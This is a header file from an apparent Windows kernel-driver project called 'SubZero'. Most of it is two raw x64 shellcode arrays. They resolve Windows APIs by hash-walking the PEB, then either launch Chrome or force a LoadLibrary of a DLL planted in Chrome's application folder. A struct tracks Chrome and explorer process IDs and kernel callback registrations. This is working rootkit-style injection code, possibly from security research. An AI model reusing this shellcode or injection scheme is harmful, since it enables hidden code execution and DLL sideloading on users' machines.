#pragma once
#include "pch.h"
#include "SubZeroCommon.h"
#include "UndocumentedImports.h"

#define DRIVER_PREFIX DRIVER_NAME ": "
#define DRIVER_TAG 'subz'
#define PARENT_PROCESS_NAME "explorer.exe"

#define PROCESS_TERMINATE 1
 
unsigned char LaunchChromeShellcode[] = "\x48\x89\xE0\x48\x81\xE4\x00\xFF\xFF\xFF\x48\x83\xC4\x08\x50\xE8\x00\x00\x00\x00\x41\x5F\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48\x31\xC9\x41\xB9\x19\x2E\xB5\xAE\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8\x51\x48\x89\xC1\xBA\x01\x00\x00\x00\xE8\x71\x00\x00\x00\x59\x44\x39\xC8\x75\xE0\x48\x31\xF6\x41\x8B\x70\x24\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48\x01\xDA\x48\x89\xD7\x48\x31\xD2\x48\x31\xC9\x48\xFF\xC1\x52\x48\x83\xF9\x0D\x75\xF6\x49\x89\xE2\x48\x31\xC9\x48\xFF\xC1\x52\x48\x83\xF9\x03\x75\xF6\x49\x89\xE3\x41\x53\x41\x52\x52\x52\x52\x52\x4D\x31\xC9\x4D\x31\xC0\x49\x8D\x8F\xF2\x00\x00\x00\x48\x83\xEC\x20\xFF\xD7\x48\x81\xC4\xD0\x00\x00\x00\xEB\x5C\x53\x57\xB8\x05\x15\x00\x00\x80\x39\x00\x74\x12\x89\xC3\xC1\xE0\x05\x01\xD8\x48\x0F\xB6\x39\x01\xF8\x48\x01\xD1\xEB\xE9\x5F\x5B\xC3\x43\x3A\x5C\x5C\x50\x72\x6F\x67\x72\x61\x6D\x20\x46\x69\x6C\x65\x73\x5C\x5C\x47\x6F\x6F\x67\x6C\x65\x5C\x5C\x43\x68\x72\x6F\x6D\x65\x5C\x5C\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x5C\x5C\x63\x68\x72\x6F\x6D\x65\x2E\x65\x78\x65\x00\x5C\xC3";
unsigned char LoadLibraryShellcode[] = "\x48\x89\xE0\x48\x81\xE4\x00\xFF\xFF\xFF\x48\x83\xC4\x08\x50\xE8\x00\x00\x00\x00\x41\x5F\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48\x31\xC9\x41\xB9\xFB\xF0\xBF\x5F\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8\x51\x48\x89\xC1\xBA\x01\x00\x00\x00\xE8\x3D\x00\x00\x00\x59\x44\x39\xC8\x75\xE0\x48\x31\xF6\x41\x8B\x70\x24\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48\x01\xDA\x48\x89\xD7\x48\x83\xEC\x30\x49\x8D\x8F\xBE\x00\x00\x00\xFF\xD7\x48\x83\xC4\x30\xEB\x67\x53\x57\xB8\x05\x15\x00\x00\x80\x39\x00\x74\x12\x89\xC3\xC1\xE0\x05\x01\xD8\x48\x0F\xB6\x39\x01\xF8\x48\x01\xD1\xEB\xE9\x5F\x5B\xC3\x43\x3A\x5C\x5C\x50\x72\x6F\x67\x72\x61\x6D\x20\x46\x69\x6C\x65\x73\x5C\x5C\x47\x6F\x6F\x67\x6C\x65\x5C\x5C\x43\x68\x72\x6F\x6D\x65\x5C\x5C\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x5C\x5C\x65\x76\x65\x6E\x74\x6C\x6F\x67\x5F\x70\x72\x6F\x76\x69\x64\x65\x72\x2E\x64\x6C\x6C\x00\x5C\xC3";

struct Globals {
	ULONG ChromePID = 0;
	ULONG ExplorerPID = 0;
	ULONG ExplorerLauncherThreadID = 0;
	ULONG ChromeFirstThreadID = 0;
	EX_RUNDOWN_REF RundownProtection;
	PVOID ObjectRegistrationHandle = nullptr;
	LARGE_INTEGER RegistryRegistrationCookie = { 0 };
};